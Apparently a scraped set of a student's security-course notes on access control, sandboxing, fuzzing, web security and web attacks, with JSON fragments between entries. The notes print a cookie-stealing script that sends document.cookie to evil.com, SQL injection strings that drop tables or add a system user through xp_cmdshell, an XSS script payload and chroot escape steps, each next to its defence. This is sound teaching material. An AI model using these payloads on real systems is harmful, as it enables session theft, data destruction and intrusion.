www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin systemd-resolve:x:101:103:,,,:/run/systemd/resolve:/usr/sbin/nologin asaligrama:x:1000:1000:Aditya Saligrama:/home/asaligrama:/usr/bin/zsh Becoming root: sudo: run a single command as root (requires you to be listed in /etc/sudoers) su: allows you to become root by knowing its password sudo su: become root without knowing its password Groups: collection of users who can share files and other system resources; every user has group ID (GID) and name Info is stored in /etc/group Processes are isolated and cannot access each other\u0026rsquo;s memory Processes run as a specific user When you run a process, it runs with your UID\u0026rsquo;s permissions Process can access any files that the UID has access to and have same permissions as that UID Processes started by root can reduce their privileges by changing their UID to a less privileged UID Effective UID (EUID): determines permissions for process Real UID (RUID): determines user that started the process Saved UID (SUID): EUID prior to change Changing user IDs using setuid(x) (syscall): root can change EUID/RUID/SUID to arbitrary values Unprivileged users can change EUID to only RUID or SUID Objects: files (sockets, pipes, hardware devices, kernel objects, process data), directories All Unix resources are managed as files All files and directories have a single user owner and group owner SETUID bit: allows you setting EUID of an executable to be the file owner rather than the executing user Operations: read, write, execute This is a simple system, but it isn\u0026rsquo;t amazingly well thought out\nPrivileged processes (EUID == 0) bypass all kernel permission checks, while unprivileged processes are subject to full permission checking Utilities like ping depend on setuid Very dangerous: a bug in many utilities can lead to full compromise Access control lists # Generically: the above is a form of an Access Control List (ACL) Every object has an ACL that identifies what operations subjects can perform Each access to an object is checked against that object\u0026rsquo;s ACL Role Based Access Control (RBAC): genericization of ACL, with larger numbers of subjects, objects, and operations Privilege and access control in Windows # Flexible ACLs Objects have full ACLs: possibility for fine-grained permissions Users can be members of multiple groups, groups can be nested ACLs support allow and deny rules Every object has a security descriptor specifying who can perform what and who can audit rules, containing: Security identifiers (SIDs) for owner and primary group of an object Discretionary ACL (DACL): access rights allowed users or groups System ACL (SACL): types of attempts that generate audit records Tokens (security context) for every process; OS checks these tokens for accesses: ID of user account ID of groups ID of login session List of OS privileges held by user/groups List of restrictions Impersonation token can be used temporarily to adopt a different context Windows Vista introduced concept of integrity levels Untrusted Low Medium High System Most processes run at medium level Low level has limited scope; e.g. can read but not write files Capabilities vs ACLs Capabilities: subject presents an unforgeable ticket that grants access to a subject System does not care who subject is, just that they have access ACLs: system checks where subject is on list of users with access to the object Relying on user permission provides user with little protection against malicious applications Malicious application running as you has access to all your files Remedies: macOS app sandbox: sandboxes applications and mediates access to resources Android process isolation: on Linux-based platform; each application runs with its own UID in its own VM Apps cannot interact with each other Limits access to system resources - decided at installation time Chrome security architecture # When Chrome starts, it spins up a number of processes responsible for only one function Network Browser: controls \u0026ldquo;chrome\u0026rdquo; part of application like address bar, bookmarks; also handles invisible and privileged parts of a browser like network requests UI Storage GPU Handles GPU tasks in isolation from other processes Device Renderer Controls anything inside of website tabs Plugin Controls plugins used by website (e.g. Flash) Communication between these processes happens through a set of hardened APIs On Windows: Chrome creates extremely restricted token that removes access to nearly every system resources As long as disk root directories have non-null security, no files (even with null ACLs) can be accessed Renderer runs as a \u0026ldquo;Job\u0026rdquo; object rather than an interactive process, this eliminates access to Desktop and display settings Clipboard Creating subprocesses Access to global atoms table _ Further isolation through putting target processes on additional virtual desktops Even further isolation by running separate copies of these processes based on site origin Open design # \u0026ldquo;The secrecy of a mechanism should not depend on the secrecy of its design of implementation\u0026rdquo; If the details of a \u0026ldquo;security-through-obscurity\u0026rdquo; system are leaked, then it is a catastrophic failure for all users If the secrets are abstracted from the mechanism (e.g. per-user keys), then leakage of a key only affects one user In cryptographic world: called Kerckhoff\u0026rsquo;s Principle \u0026ldquo;A cryptosystem should be secure even if everything about the system, other than keys, are public knowledge\u0026rdquo; "},{"id":96,"href":"/notes/cs155/2022-04-11-isolation-and-sandboxing/","title":"Isolation and Sandboxing","section":"CS 155, Spring 2022","content":" Isolation and Sandboxing # Goal: run untrusted code without compromising systems\nPrograms from untrusted Internet sites Mobile apps, JS, browser extensions Exposed applications: Browser, PDF viewer, email client Legacy daemons: sendmail, bind Honeypots If application misbehaves, want to kill it Approach: confinement # Idea: ensure misbehaving app cannot harm rest of system Can be implemented at many levels Hardware: run application on isolated hardware (airgap) - difficult to manage Virtual machines: isolate OS\u0026rsquo;s on a single machine Process level: system call interposition; isolate a process in a single OS Threads: software fault isolation (SFI) Isolating threads sharing same address space Application level confinement e.g. browser sandbox for Javascript and WebAssembly Implementation # Key component: reference monitor\nMediates requests from applications Enforces confinement Implements a specified protection policy Must always be invoked; every application request must be mediated Tamperproof: reference monitor cannot be killed; if it is, then monitored process is also killed Example: chroot jail # To use (must be root):\nchroot /tmp/guest su guest Root dir / is now /tmp/guest EUID set to guest Now /tmp/guest is added to every file system access fopen(\u0026#39;/etc/passwd\u0026#39;, \u0026#39;r\u0026#39;); // becomes the below: fopen(\u0026#39;/tmp/guest/etc/passwd\u0026#39;, \u0026#39;r\u0026#39;); chroot should only be executable by root, otherwise jailed app can do Create dummy file /aaa/etc/passwd Run chroot /aaa Run su root to become root Many ways to escape jail as root: Create device that lets you access raw disk Send signals to non-chrooted process Reboot system Bind to privileged ports FreeBSD jail # Stronger mechanism than simple chroot To run: jail [jail-path] [hostname] [IP-addr] [cmd] Calls hardened chroot (no ../../ escape) Can only bind to sockets with specified IP addresses and authorized ports Can only comunicated with processes inside jail Root is limited, e.g. cannot load kernel modules Problems with chroot jails # Coarse policies: all or nothing access to parts of a file system Inappropriate for apps like web browsers, which need access to files outside jail (e.g. for sending attachments over email) Does not prevent malicious apps from Accessing network and messing with other machines Trying to crash host OS System call interposition # Observation: to damage host system (e.g. persistent changes), app must make system calls To delete/overwrite files: unlink, open, write To do network attacks: socket, bind, connect, send Idea: monitor app\u0026rsquo;s system calls and block unauthorized calls Implementation options Completely kernel-space (e.g., Linux seccomp) Completely user-space (e.g., program shepherding) Hybrid (e.g. systrace) Early implementation: Janus (1996) # Linux ptrace: process tracing Process calls ptrace(..., pid_t pid, ...) and wakes up when pid makes system call If monitored process calls fopen, monitor decides if application is allowed, if not, monitor kills application Example policy (e.g., for PDF reader) path allow /tmp/* path deny /etc/passwd network deny all Manually specifying policy for an app can be difficult Recommended default policies are available, can be made more restrictive as needed Complications If app forks, monitor must also fork; forked monitor monitors forked app If monitor crashes, app must be killed Monitor must maintain all OS state associated with the app Current working directory, UID, EUID, GID When app does cd path monitor must update its CWD Problems with ptrace: Trace all system calls, which can be inefficient: no need to trace close system call Monitor can abort syscall without killing app Race conditions (time of check/time of use - TOCTOU bug) since checking/opening is not atomic Proc 1: open(\u0026quot;me\u0026quot;) Monitor checks and authorizes Proc 2: symlink me to /etc/passwd OS executes open(\u0026quot;me\u0026quot;) SCI in Linux: seccomp-bpf # seccomp-bpf: Linux kernel facility used to filter process syscalls Syscall filters written in BPF language (use BPFC compiler) Used in Chromium, Docker containers, etc. How this works: Chrome renderer process starts prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, \u0026amp;bpf_policy) Renderer process renders site If due to exploit the process tries to do fopen(\u0026#34;/etc/passwd\u0026#34;, \u0026#34;r\u0026#34;); then seccomp-bpf will kill process BPF filters (policy programs): # Process can install multiple BPF filters Once installed, filter cannot be removed - all run on every syscall If process forks, child inherits all filters If program calls execve, all filters are preserved BPF filter input: syscall number, syscall args., system architecture Filter returns one of SECCOMP_RET_KILL: kill process SECCOMP_RET_ERRNO: return specified error to caller SECCOMP_RET_ALLOW: allow syscall Installing a BPF filter # Must be called before setting BPF filter Ensures setuid, setgid ignored on subsequent execve Attacker cannot elevate privilege int main (int argc, char **argv) { prctl(PR_SET_NO_NEW_PRIVS, 1); // kill if call open() for write prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, \u0026amp;bpf_policy); fopen(\u0026#34;file.txt,\u0026#34; \u0026#34;w\u0026#34;); assert(false); // should never reach here } Docker: isolating containers using seccomp-bpf # Container: process-level isolation\nContainer prevented from making syscalls filtered by seccomp-bpf Whoever starts container can specify BPF policy default policy blocks many syscalls, including ptrace e.g. Nginx: docker run --security-opt=\u0026quot;seccomp=filter.json\u0026quot; nginx \u0026#34;defaultAction\u0026#34;: \u0026#34;SCMP_ACT_ERRNO.\u0026#34; // deny by default \u0026#34;syscalls\u0026#34;: [ { \u0026#34;names\u0026#34;: [\u0026#34;accept\u0026#34;], // syscall name \u0026#34;action\u0026#34;: \u0026#34;SCMP_ACT_ALLOW\u0026#34;, // allow (whitelist) \u0026#34;args\u0026#34;: [] // what args to allow }, // ... ] More Docker confinement flags: Specify an unprivileged user: docker run --user www nginx Limit Linux capabilities: drop all capabilities, allow bind to privileged ports: docker run --cap-drop all --cap-add NET_BIND_SERVICE nginx Prevent process from becoming privileged (e.g. by a setuid binary) docker run --security-opt=no-new-privileges:true nginx Limit number of restarts and resources docker run --restart=on_failure:$MAX_RETRIES --ulimit nofile=$MAX_FD --ulimit nproc=$MAX_NPROC nginx Confinement via virtual machines # About VMs: see my notes from CS 111\nHypervisor security assumption # Malware can infect guest OS and guest apps But malware cannot escape from the infected VM Cannot infect host OS or other VMs on the same hardware Requires that hypervisor protects itself and is not buggy Some hypervisors are much simpler than a full OS Problem: covert channels # Unintended communication channel between isolated components Can leak classified data from secure component to public component Example communication between cooperating malware and listener To send a bit, malware does b = 1: at 1:00am, do CPU intensive calculation b = 0: at 1:00am, do nothing At 1:00am, listener does CPU intensive calculation and measures completion time b = 1: completion time \u0026gt; threshold Many covert channels exist in running system File lock status, cache contents, interrupts, etc. Difficult to eliminate all VMs from different customers may run on same machine in the cloud However, some data may leak VMs in end-user environments # Qubes OS: a desktop/laptop OS where everything is a VM Runs on Xen hypervisor Access to peripherals (mic, camera, USBs, \u0026hellip;) controlled by VMs Every window frame identifies VM source Hypervisor detection # Malware can detect hypervisor and refuse to run to avoid reverse-engineering Software that binds to hardware can refuse to run in VM DRM systems may refuse to run on top of hypervisor How to detect? VM platforms often emulate simple hardware (e.g. i440bx chipset) but reports 8GB RAM, dual CPUs, etc Hypervisor introduces time latency variances Memory cache behavior differs in presence of hypervisor Results in relative time for any two operations Hypervisor shares TLB with guest OS Guest OS can detect reduced TLB size Can do detection in the browser Timing variations in writing to the screen Disadvantages identification of malware websites using VMs The perfect hypervisor does not exist Hypervisors today focus on compatibility (ensuring off-the-shelf software works) and performance (minimizing virtualization overhead) VMMs do not provide transparency - anomalies reveal existence of hypervisor "},{"id":97,"href":"/notes/cs155/2022-04-13-vuln-finding/","title":"Vuln Finding","section":"CS 155, Spring 2022","content":" Finding vulnerabilities using fuzzing, dynamic, and static analysis # Conceptualizing vulnerabilities # Computer programs can be thought of as finite state machines The code we want to write represents states we intend to reach However, code can also have unintended states if miswritten Bugs exist when there are reachable states in the runnable state machine (the code) that have no corresponding state in the intended state machine (the design) Vulnerabilities live in this unintended space; exploitation is making the program do \u0026ldquo;interesting\u0026rdquo; transitions in the unintended state space Types of bugs: Design issue: the conceptual state machine does not meet intended goals e.g. hardcoded admin password Functionality issue: the code has bad transitions between validly represented states e.g. save button code broken, no transition to \u0026ldquo;saving file\u0026rdquo; state Implementation issue: code introduces new states not represented in conceputal state machine e.g. lack of length check introduces new \u0026ldquo;stack corruption\u0026rdquo; state Other ways to reach unintended states: Hardware fault: hardware suffers a glitch that causes a transition to an unintended state even if the code is perfect e.g. a cosmic ray flips a bit in memory, causing an otherwise impossible state Transmission error: the code is correct but is corrupted in-flight e.g. a program downloaded from the internet suffers packet corruption, so the program that is run differs from what was intended to run Fuzzing # Observe: for interesting programs, impossible to manually explore full state space to find unintended states Idea: find bugs in a program by feeding random, corrupted, or unexpected data Random inputs will explore a large part of the state space Some unintended states are observable as crashes (e.g. SIGSEGV, abort()) Any crash is a bug, but only some crashes are observable Fuzzing works best on programs that parse files or process complex data Can be simple as cat /dev/random | head -c 512 \u0026gt; rand.jpeg; open rand.jpeg However, will not cover much of search space - will be rejected because invalid jpeg Can randomly corrupt real JPEG files, create \u0026ldquo;JPEG-looking\u0026rdquo; data, and measure JPEG parser to see how deep we\u0026rsquo;re getting into the code Common fuzzing strategies # Mutation-based fuzzing: randomly mutate test cases from corpus of input files Steps: Collect a corpus of inputs that explores as many states as possible Perturb inputs randomly, possibly guided by heuristics Modify: bit flips, integer increments Substitute: small integers, large integers, negative integers Run the program on the inputs and check for crashes Goto step 2 Advantages: Simple to set up and run Can use off-the-shelf software for many programs Limitations: Results depend strongly on the quality of the initial corpus Coverage may be shallow for formats for checksums or validation Still can be successful: fully random mutation based-fuzzing found many exploitable-looking crashes in PDF viewers in 2010 Generation-based (smart) fuzzing: generate test cases based on a specification for the input format Steps: Convert a specification of the input format (RFC, etc.) into a generative procedure Generate test cases according to the procedure and introduce random perturbations Run the program on the inputs and check for crashes Goto step 2 e.g. Syzkaller: kernel system calll fuzzer that uses test case generation and coverate Test cases are sequences of syscalls generated from syscall descriptions Runs the test case program in a VM Kernel crashes in the VM indicate possible LPE vulnerabilities Advantages: Can get deeper coverage faster by leveraging knowledge of the input format Input format/protocol complexity is not a limit on coverage depth Limitations: Requires a lot of effort to set up Succesful fuzzers are often domain-specific; Coverage limited by accuracy of the spec, where implementation may diverge Coverage-guided fuzzing Key insight: code coverage is a useful metric; why not use it as feedback to guide fuzzing? Types: Basic block coverage: has this basic block in the CFG been run? Edge coverage: has this branch been taken? Path coverage: has this particular path through the program been taken? Advantages: Very good at finding new program states, even if the initial corpus is limited Combines well with other fuzzing strategies Successful track record Limitations: Not a panacea to bypass strong checksums or input validation Still doesn\u0026rsquo;t find all types of bugs (e.g. race conditions) American Fuzzy Lop (AFL) # Compile the program with instrumentation to measure coverage Trim the test cases in the queue to the smallest size that doesn\u0026rsquo;t change program behavior Create new test cases by mutating the files in the queue using traditional fuzzing strategies If new coverage is found in a mutated file, add it to the queue Goto step 2 Dynamic analysis # Analyze a program\u0026rsquo;s behavior by actually running its code May be combined with compile-time modifications like instrumentation Can modify program behavior dynamically Useful for rapid experimentation Often complements fuzzing very well e.g. AddressSanitizer (ASan) Fast memory error detecter for C/C++ using compiler instrumentation and a runtime library that replaces malloc to surround allocations with redzones Catches the following: Out-of-bounds accesses Use-after-free Use-after-return Use-after-scope Double-free, invalid-free Memory leaks e.g. Frida Dynamic instrumentation for closed-source binaries Execute custom scripts inside analyzed process Hook functions, trace execution, modify behavior Great way to fuzz internal functions without writing a harness Static analysis # Using a tool to analyze a program\u0026rsquo;s behavior without actually running it Test whether a certain property holds or find places where it is violated Static analysis can prove some properties about the program that fuzzing and dynamic analysis can\u0026rsquo;t e.g. prove that a program has no NULL pointer dereferences Still lots of room for improvement However, cannot be perfect - reduces to halting problem Can either be sound (everything found is a bug, but some bugs may be missed) or complete (finds every bug, but may be false positives) Most are neither sound nor complete Data flow analysis # Determine possible values of variables at points in the control flow graph Needs approximations; express precise set of possible values may be arbitrarily complex Taint analysis: identify sources of \u0026ldquo;tainted data\u0026rdquo; User/attacker input Reads from files/network Check if tainted data flows into a \u0026ldquo;trusted sink\u0026rdquo; - memcpy, free, bzero e.g. Clang static analyzer Check for common security issues with a static analysis framework in the compiler Built in checkers: Bufer overflows Refcount errors malloc integer overflows Insecure API use Uninitialized value use e.g. CodeQL Query language for finding patterns in large codebases Works best with a specific bade code pattern in mind Manual analysis # Reverse engineering: looking at a compiled program in order to figure out what it does and how it works Usually assisted by disassembler, decompiler, strings Often aided by dynamic analysis (i.e. tracing) e.g. IDA Pro: disassembly, decompilation, binary analysis, scripting e.g. Ghidra: like IDA Pro, but open source and written by the NSA Tips for writing secure software # Software tests: one of the most effective ways to reduce bugs Unit tests: check that each piece of code behaves as expected in isolation Goal: Unit tests should cover all code, including error handling Would eliminate many exploitable bugs Regression tests: check that old bugs haven\u0026rsquo;t been reintroduced Integration tests: check that modules work together as expected General other tips: Use modern, memory safe languages where possible: Go, Rust, Swift, etc. Understand and document threat model early in design process Design APIs and systems so that the easiest way to use them is the safe way Treat all outside input adversarially, even if sender is trusted Use clean, consistent style through codebase "},{"id":98,"href":"/notes/cs155/2022-04-18-web-security/","title":"Web Security","section":"CS 155, Spring 2022","content":" Web Security Model # Web security goals # Safely browse the web: Sites should not be able to steal data from device, install malware, access camera, etc Sites should not be able to affect or eavesdrop on other sessions Support secure high-performance web apps Web-based applications should have same or better security properties as desktop applications Attack models # Malicious website Malicious external resources Network attacker Malware attacker HTTP protocol # ASCII protocol from 1989 that allows fetching resources (e.g. HTML file) from a server Two messages: request and response Stateless protocol beyond a single request and response Every request has a uniform resource location (URL) Request looks like\nGET /index.html HTTP/1.1 Accept: image/gif, image/x-bitmap, image/jpeg, */* Accept-Language: en Connection: Keep-Alive User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 95) Host: www.example.com Referer: http://www.google.com?q=dingbats First line: method, path, version Rest: headers There can be a body, but is empty here Response looks like\nHTTP/1.0 200 OK Date: Sun, 21 Apr 1996 02:20:42 GMT Server: Microsoft-Internet-Information-Server/5.0 Content-Type: text/html Last-Modified: Thu, 18 Apr 1996 17:39:05 GMT Content-Length: 2543 \u0026lt;html\u0026gt;Some data... announcement! ... \u0026lt;/html\u0026gt; First line: status code Until empty line: headers After empty line: body HTTP/2: released in 2015, mainly performance improvements\nHTTP methods # GET: get the resource at the specified URL (does not accept message body) Should not change server state (some servers do perform side effects) POST: create new resource at URL with payload PUT: replace target resource with request payload PATCH: update part of the resource DELETE: delete specified URL External resources # When loading a website, browser sends GET request to site, server sends HTML file back Root HTML page can include additional resources (e.g. images, video, fonts) Can include images from different domain Can also load other websites within their window: frames/iframes Allows delegating screen area to content from another source (e.g. ads) After parsing page HTML, browser requests additional resources Javascript # Websites deliver scripts to be run inside of the browser Additional web requests Read browser data Manipulate page Access local hardware Document Object Model (DOM): Javascript reads/modify pages by interacting with DOM tree Object-oriented interface for reading/writing page content Browser takes HTML -\u0026gt; structured data (DOM) Basic execution model: Loads content of root page Parses HTML and runs included Javascript Fetches additional resources (e.g. images, CSS, Javascript, iframes) Responds to events like onClick, onLoad, etc. Iterate until page is done loading (which might be never) Session management via cookies # HTTP is stateless: no session information saved on server Session management done via cookies: small pieces of data that a server sends to a browser Browser may store and send back in future requests to site Useful for: Session management (e.g. logins) Personalization (e.g. user preferences) Tracking Setting cookie: in HTTP response header Set-Cookie: trackingID=3272923427328234 Set-Cookie: userID=F3D947C2 Sending cookie: in HTTP request header Cookie: trackingID=3272923427328234 Cookie: userID=F3D947C2 Example: session involving login Websites of the same origin have access to each other\u0026rsquo;s cookies, even if opened in different tabs Cookies set by a domain are always sent for any request to that domain Includes subrequests made by a different domain Includes both GET and POST requests Web Security Model # Subjects: Origins: a unique scheme://domain:port The following are different origins: http://saligrama.io http://www.saligrama.io http://saligrama.io:8080 https://saligrama.io The following are the same origin: https://saligrama.io https://saligrama.io:443 https://saligrama.io/experience Objects: DOM tree, DOM storage, cookies, Javascript namespace, hardware permissions Same Origin Policy (SOP) Goal: isolate content of different origins Confidentiality: script on evil.com should not be allowed to read bank.ch Integrity: evil.com should not be able to modify the content of bank.ch Bounding origins: windows Every window and frame has an origin Origins are blocked from accessing another origin\u0026rsquo;s objects If bank.com is loaded in a tab and so is attacker.com then attacker.com cannot Read or write content from bank.com Read or write bank.com\u0026rsquo;s cookies Detect that the other tab has bank.com loaded If bank.com is loaded in an iframe in attacker.com then attacker.com cannot Read content from bank.com\u0026rsquo;s frame Access bank.com\u0026rsquo;s cookies If cookies are included, browser will fulfill the request and potentially display it to the user, but attacker.com cannot actually read the cookies Detect that bank.com has loaded Note: loading content != seeing or reading said content For other HTTP resources: Images: browser renders cross-origin images, but SOP prevents page from inspecting individual pixels Can check size and loading status CSS, Fonts: can load and use, but not directly inspect Scripts: can be loaded from other origins, scripts execute with privileges of parent frame/windows origin Cannot view source, but can call API functions Allows loading library from CDN and using it to alter page If a malicious library is loaded, it can also steal data (e.g. cookies) Domain relaxation # Can change document.domain to be a superdomain a.domain.com -\u0026gt; domain.com is ok b.domain.com -\u0026gt; domain.com is ok a.domain.com -\u0026gt; com is not ok a.domain.co.uk -\u0026gt; co.uk is not ok Checks against Public Suffix List Domain relaxation attacks: malicious.github.io can set domain to github.io and steal GitHub login credentials Solution: both sides must set document.domain to github.io to share data (github.io effectively grants permissions) Same-Origin Policy for Javascript # Javascript can make network requests to load additional content or submit forms using XMLHTTPRequests (XHR) $.ajax({url: “/article/example“, success: function(result){ $(\u0026#34;#div1\u0026#34;).html(result); }}); Malicious XHR: // on attacker.com $.ajax({url: “https://bank.com/account“, success: function(result){ $(\u0026#34;#div1\u0026#34;).html(result); } }); Same-Origin Policy for XHR Can only read data from GET responses if they\u0026rsquo;re from same origin, or if destination origin gives permission to read its data Cannot make POST or PUT requests to a different origin, unless destination origin grants permissions to do so XHR requests (both sending and receiving side) are policed by Cross-Origin Resource Sharing (CORS) Cross-Origin Resource Sharing (CORS) Reading permission: servers add Access-Control-Allow-Origin header that tells browser to allow Javascript to allow access for another origin Sending permission: performs \u0026ldquo;pre-flight\u0026rdquo; permission check to determine whether server is willing to receive request from origin Except for simple requests that could be made without Javascript Requests must meet all of following criteria to avoid such a trip: Method: GET, HEAD, POST If sending data, content type is application/x-www-form-urlencoded or multipart/form-data or text/plain No custom HTTP headers, only some standardized ones Example: CORS success Example: CORS failure Same-Origin Policy for Cookies # Cookies have different definition of origin than DOM: (domain, path) e.g. (cs155.stanford.edu, /foo/bar) A page can set cookie for its domain or any parent domain (as long as parent domain is not a public suffix) Can set a cookie for its path or any parent path e.g. stanford.edu cannot set for cs155.stanford.edu, but vice versa is possible e.g. website.com/login can set cookie for website.com, but not vice versa Browser sends cookies that are in a URL\u0026rsquo;s scope Scope: belongs to domain or parent domain, and is located at the same path or parent path Javascript cookie access # Developers can additionally manipulate in-scope cookies through Javascript by modifying values in document.cookie: document.cookie = \u0026#34;name=aditya\u0026#34;; function alertCookie() { alert(document.cookie); } \u0026lt;button onclick=\u0026#34;alertCookie()\u0026#34;\u0026gt;Show Cookies\u0026lt;/button\u0026gt; This leads to a SOP policy collision. On cs.stanford.edu/zakir, run the following code, which will actually show dabo\u0026rsquo;s cookies on zakir\u0026rsquo;s page: const iframe = document.createElement(\u0026#34;iframe\u0026#34;); iframe.src = \u0026#34;https://cs.stanford.edu/dabo\u0026#34;; document.body.appendChild(iframe); alert(iframe.contentWindow.document.cookie); Third-party cookie access # If bank inclues Google Analytics Javascript (from google.com), it can access bank\u0026rsquo;s auth. cookie, since Javascript always runs with permissions of the window const img = document.createElement(\u0026#34;image\u0026#34;); img.src = \u0026#34;https://evil.com/?cookies=\u0026#34; + document.cookie; document.body.appendChild(img); To prevent: HttpOnly Cookies - setting to prevent cookies from being accessed by document.cookie API Never sent by browser because (google.com, /) does not match (bank.com, /) Cannot be extracted by Google Javascript that runs on bank.com Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; HttpOnly This is OK if everything is done over TLS, so network attacker cannot see traffic However, if attacker tricks user into visiting http://bank.com, since there is no scheme in Cookie SOP, attacker can see the cookie Secure Cookies: only send to server with an encrypted request over HTTPS protocol Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; Secure "},{"id":99,"href":"/notes/cs155/2022-04-20-web-attacks/","title":"Web Attacks","section":"CS 155, Spring 2022","content":" Web Attacks # Cookie Attack # Suppose CS155 allows you to login and submit homework at cs155.stanford.edu Login with username and password; cs155.stanford.edu responds with cookies: session=abc Now access dabo.stanford.edu/memes, dabo.stanford.edu sets cookie to cookies: session=def for Domain=stanford.edu Now browser will send both session cookies, and it is up to server to determine which is correct Cross-Site Request Forgery # Type of web exploit where a website transmits unauthorized commands as a user that the web app trusts In CSRF attack, user is tricked into submitting an unintended/unrealized request to website Cookie-based authentication is not sufficient for requests that have any side effect Preventing CSRF attacks: Referer validation Secret validation token Custom HTTP header sameSite cookies Referer validation # Referer header contains address of previous web page from which a link to currently requested page was followed Allows servers to identify where people are visiting from https://bank.com requesting https://bank.com is ok https://evil.com requesting https://bank.com is not ok No referer requesting https://bank.com: up to website Referer is not required by HTTP spec, and can lead to privacy leak (website B knows you visited website A first) so people sometimes want to delete it Secret validation token # bank.com includes a secret value in every form that the server can validate \u0026lt;form action=“https://bank.com/transfer\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;!-- Request will fail without the token --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=“434ec7e838ec3167ef5\u0026#34;\u0026gt; \u0026lt;input type=“text\u0026#34; name=\u0026#34;to\u0026#34;\u0026gt; \u0026lt;input type=“text\u0026#34; name=“amount”\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Transfer!\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; Coming up with a secret token that user can access but attacker can\u0026rsquo;t: Send session-specific token as part of the page Attacker cannot access because SOP blocks reading content Forcing CORS pre-flight # Requests that required and passed CORS pre-flight check are safe Typical GET and POST don\u0026rsquo;t require pre-flight even if XHR We can force browser to make pre-flight check and tell server Add custom header to XHR Forces pre-flight Never sent by browser itself when performing normal GET or POST Typically developers use X-Requested-By or X-Requested-With sameSite cookies # Cookie option that prevents browser from sending cookie along with cross-site requests Strict mode: never send cookie in any cross-site browsing context even when following a regular link Lax mode: session cookie is allowed when following a regular link but blocks it in CSRF-prone request methods (e.g. POST) SQL injection # e.g. login form\n$login = $_POST[\u0026#39;login\u0026#39;]; $pass = $_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT id FROM users WHERE username = \u0026#39;$login\u0026#39; AND password = \u0026#39;$password\u0026#39;\u0026#34;; $rs = $db-\u0026gt;executeQuery($sql); if $rs.count \u0026gt; 0 { // success } With non-malicious input, this is totally ok! Suppose with malicious input: username: ' or 1=1 -- password: 123 Then the SQL statement will look like: SELECT id FROM users WHERE uid=\u0026#39;\u0026#39; or 1=1 -- AND pwd... This will return every user in the database! Alternatively: username: '; DROP TABLE [users] -- password: 123 Then the SQL statement will look like: SELECT id FROM users WHERE uid=\u0026#39;\u0026#39;; DROP TABLE [users] -- AND pwd... This will delete all user info in the database Even worse: Microsoft SQL server lets you run arbitrary shellcode through xp_shellcmd username: '; exec xp_cmdshell 'net user add user pwd' -- password: 123 Then the SQL statement will look like: SELECT id FROM users WHERE uid=\u0026#39;\u0026#39;; exec xp_cmdshell \u0026#39;net user add user pwd\u0026#39; -- AND pwd... This will add a user account controlled by the attacker to the system (not database!) Preventing SQL injection # Never trust user input, particularly when constructing a command Avoid building SQL statements yourself There are tools for safely passing user input to databases: Parametrized (i.e. prepared) SQL - allows you to send query and arguments separately to server No need to escape untrusted data Faster because server can cache query plan ORM (Object Relational Mapper) - uses prepared SQL internally e.g. Django Cross-Site Scripting (XSS) # Attack occurs when application takes untrusted data and sends it to a web browser without proper validation or sanitization Command/SQL injection: attacker\u0026rsquo;s malicious code is executed on app server XSS: attacker\u0026rsquo;s malicious code is executed on victim\u0026rsquo;s browser e.g. search on https://google.com/search?q=apple\n\u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Search results\u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Results for \u0026lt;?php echo $_GET[\u0026#34;q\u0026#34;] ?\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; With non-malicious input: totally ok! With malicious input: Search query: https://google.com/search?q=\u0026lt;script\u0026gt;alert(\u0026quot;hello\u0026quot;)\u0026lt;/script\u0026gt; Rendered in browser: \u0026lt;h1\u0026gt;Results for \u0026lt;script\u0026gt;alert(\u0026#34;hello\u0026#34;)\u0026lt;/script\u0026gt;\u0026lt;/h1\u0026gt; Can use this to steal cookies (or really do anything within \u0026lt;script\u0026gt;...\u0026lt;/script\u0026gt;) Reflected XSS # Attack script is reflected back to the user as part of a page from the victim\u0026rsquo;s site e.g. Attackers contacted PayPal users via email and fooled them into accessing a URL on legitimate PayPal website Injected code redirected PayPal visitors to a page warning users their accounts had been compromised Victims were then redirected to a phishing site and prompted to enter sensitive financial data Stored XSS # The attacker stores the malicious code in a resource managed by the web application, such as a database Old forum software has these bugs MySpace tried to filter out script-type tags, but missed one (e.g. can run JS inside of CSS tags) Preventing XSS # Previously: tried to filter out tags that could be possibly part of an attack However: this is very hard: huge amount of different ways to run JS content Content Security Policy (CSP): HTTP header that servers can send which declares which dynamic resources (e.g. JS) are allowed e.g. JS: Content-Security-Policy: script-src 'self' JS can only be loaded from the same domain as the page No JS will be executed from other domains No inline scripts will be executed Can be very particular about where any type of resources (e.g scripts, fonts, CSS, images) can be loaded from Mozilla default policy: only allow images, scripts, AJAX, form actions, CSS from same origin, and does not allow any other resources to load (and no inline scripts) "},{"id":100,"href":"/notes/cs155/2022-04-25-web-defenses/","title":"Web Defenses","section":"CS 155, Spring 2022","content":" Authentication and Session Management # Pre-history: HTTP auth # HTTP request: GET /index.html HTTP response contains: WWW-Authenticate: Basic realm=\u0026quot;Password Required\u0026quot; Browser sends hashed password on all subsequent HTTP requests Caveats: User cannot log out other than by closing browser What if user has multiple accounts? Site cannot customize password dialog Confusing dialog to users Easily spoofed Modern session management # Login # When visiting website, site creates anonymous session and hands session ID back in a cookie User will POST with username and password, website checks credentials and elevates token to logged-in Logout # Delete session token from client Mark session token as expired on server Authenticating users # First idea: plaintext passwords (terrible) Store password and check match against user input Don\u0026rsquo;t trust anything that provides you your password Second idea: store password hash (bad) Store SHA-1(pw) and check match against SHA-1(input) Weak against attacker who has hashed common passwords Third idea: store salted hash (better) Store (r, SHA-1(pw + r)) and check against SHA-1(input + r) Prevents attackers from precomputing password hashes Need to make sure to choose a hash function that is expensive to compute In practice: use bcrypt, scrypt, or pbkdf2 when building an application Phishing attacks # Attacker sends a fraudulent message that tricks user into revealing sensitive data (e.g. login, credit card) 